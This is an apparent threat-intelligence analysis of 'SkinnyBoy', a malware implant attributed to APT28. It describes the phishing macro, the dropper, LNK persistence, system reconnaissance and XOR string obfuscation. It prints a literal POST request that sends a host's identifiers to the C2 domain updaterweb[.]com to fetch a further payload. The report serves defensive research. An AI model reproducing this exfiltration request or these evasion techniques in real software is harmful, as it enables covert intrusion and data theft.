EXECUTIVE SUMMARY
This paper presents an analysis of a new
and previously unreported malware
internally dubbed as "SkinnyBoy".
Based on long-term observations and
technical evidence, Cluster25 cyber
intelligence research team associates
this implant, with a medium-high degree
of confidence, to the threat actor known
as APT 28 / Fancy Bear / Pawn Storm

INTRODUCTION

01 INTRODUCTIO
APT 28 (aka Pawn Storm, Fancy Bear, Strontium) is a famous hacking group that often grabs the
media's attention when suspected of perpetrating cyber intrusions that occurred against high
profile public and private institutions.
It's categorized as APT (Advanced Persistent Threat) because this adversary pursues a welldefined set of goals against a set of well-defined targets. Presumably operating since the
mid-2000s, its techniques, tactics, and procedures are compatible with a state-sponsored threat
actor. The group usually targets companies and organizations operating in the military,
government, and diplomatic sectors, and security organizations aligned with the NATO
objectives.
This adversary can adopt different techniques and tactics to obtain initial access to the victim's
system. Among these there are certainly:
1. Watering hole attacks against compromised websites frequently visited by targets
2. Exploit kit / 0day and common vulnerabilities used to infect targets
3. Social engineering techniques, such as spear-phishing email messages
4. Credential Theft
However, even though these techniques can sometimes be very evolved, it is not unusual to
observe and correlate less sophisticated activities aimed at obtaining a foothold in the targeted
perimeter.
Indeed, APT28 / Fancy Bear has been observed quite often updating their tools and malware
implants. While over time it was possible to notice substantial increases in sophistication even
among different samples of the same malware family, other times the level of sophistication was
significantly lower than expected.

INTRODUCTION

Considering the group's capabilities, the tactic of significantly lowering these levels becomes
functional with an attempt to deceive the APT nature of the sample and make any attribution
effort more complex.
This is the case of the last implant observed by our research team which has a rather low level of
sophistication and basic operating logic even if fully operational and functional. This implant,
which is still unreported at the time of writing, has been internally called SkinnyBoy and its
attribution goes to APT28/Fancy Bear group after months of observations.
Before analyzing this sample, we found out it was uploaded on a popular online platform and
detected only by Microsft Defender engine as belonging to the "AceLog" family.
During our analysis, we came to the conclusion that this implant was used to target military and
government institutions.

INTRODUCTION

02 ADVERSARY OPERATIONAL SECURIT
During the analysis of the campaign, the adversary was observed using commercial VPN
services as part of their OPsec in order to hide thier tracks. The same VPN services were used to
purchase and manage their infrastructure during this campaign, according to the simplified
scheme shown below:

INFECTION CHAIN
Comparable with previous APT28 /
Fancy Bear attacks, the actor used
spear-phishing techniques to deliver
multi-staged infection chains with at
least two different drop points.

INFECTION CHAIN

01 VECTOR AND FIRST STAG
The vector of the infection is a spear phishing email delivering a Word Office document with a
significant name related to an International Conference. Both the vector and its naming are
consistent with APT28 / FancyBear TTPs.
As expected, the document triggers a MACRO function able to extract a Microsoft Dynamic Link
Library (DLL) which then acts as downloader of a SkinnyBoy dropper (tdp1.exe) from a first
dropurl.

02 SKINNYBOY DROPPE
tpd1.exe is the second stage of the infection. Once downloaded in the victim's file system, it
extracts all the components necessary to set persistence and trigger the following malicious
operations. The extracted payload is encoded in Base64 format and appended as an overlay in
the executable file.

INFECTION CHAIN

At the time of execution, the malicious process decodes the payload and, starting from it, writes
two different files on the filesystem, then deletes itself. The dropped files are:
-C:\Users\%username%\AppData\Local\devtmrn.exe
(2a652721243f29e82bdf57b565208c59937bbb6af4ab51e7b6ba7ed270ea6bce)
- C:\Users\%username%\AppData\Local\Microsoft\TerminalServerClient\TermSrvClt.dll
(ae0bc3358fef0ca2a103e694aa556f55a3fed4e98ba57d16f5ae7ad4ad583698)
The names of the dropped files and of the created folder are stored in the executable in a
encrypted way. The actor used a different XOR key for each string used. Some of these
associations are shown in the following table.

Tab. 1 - Used XOR keys

To stay under the radar, the malware never executes the extracted files. Instead, it creates a
persistence mechanism on the infected machine which allows a delayed execution of the next
stages.
It creates a LNK file under Windows Startup folder (%appdata%\Microsoft\Windows\Start
Menu\Programs\Startup), named devtmrn.lnk, which points to the extracted malware
devtmrn.exe.
The creation of the link file occurs through a Windows COM object instantiated using the
CoCreateInstance WinAPI function, passing the CLSID associated to LNK files as argument

03 SKINNYBOY LAUNCHE
Once the machine reboots, the LNK file, placed into system's Startup folder, triggers the
execution of the devtmrn.exe executable, which simply acts as a launcher of the main implant.
When launched, it only checks the existence of the following path

C:\Users\%username%\AppData\Local\Microsoft\TerminalServerClient\TermSrvClt.dll

and starts a new process invoking the first DLL exported function, named RunMod

INFECTION CHAIN

To identify the right DLL to launch, the executable calculates the SHA256 hashes of each
filename into C:\Users\%username%\AppData\Local comparing each one of them with the
pre-computed SHA256 of the string TermSrvClt.dll, which is:

F4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97 13 2C 6D 07 6F 86

Hashes are calculated through classic WinAPI functions, such as CryptHashData and
CryptGetHashParam, as illustrated in the following figure.

INFECTION CHAIN

04 SKINNYBOY IMPLAN
The DLL executable, named TermSrvClt.dll, corresponds to the main implant of the infection
chain. It exfiltrates information about the infected system and retrieves and launches the final
payload.
Once triggered, the process executes two Windows utilities to gather information about the
system, systeminfo.exe and tasklist.exe. subsequently, it extracts a list of filenames contained
in a subset of interesting directories, which are:
- C:\Users\%username%\Desktop
- C:\Program Files
- C:\Program Files (x86)
- C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Administrative Tools
- C:\Users\%username%\AppData\Roaming
- C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates
- C:\Windows
- C:\Users\user\AppData\Local\Temp
The output of this phase is concatenated using a fixed structure, which is then sent to the
Command and Control, updaterweb[.]com, using a POST request with the following body
schema:

After completing the first HTTPS POST request containing the gathered information, the malware
contacts the C2 again in order to retrieve the next payload. The new POST request is structured
as follow:

POST https://updaterweb.com/ HTTP/1.1
User-Agent: Opera
Host: updaterweb.com
Content-Length: 37
Cache-Control: no-cache
id={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL}&cmd=y
Tab. 4 - Second POST request

To avoid static detection, the format strings used to build the POST request body are XORED
using two different keys, as seen in the previous stage.

Finally, the Command and Control should reply with the next DLL that will be executed,
representing the final stage of the infection, which probably manifests backdoor behaviors.
By statically analyzing the TermSrvClt.dll compiled code, we can assume that once the server
correctly replies, it stores the downloaded file in %TEMP% folder, self-injecting and executing it in
memory using the LoadLibrary and GetProcAddress WinAPIs.
The downloaded file is then deleted to covert the infection tracks.
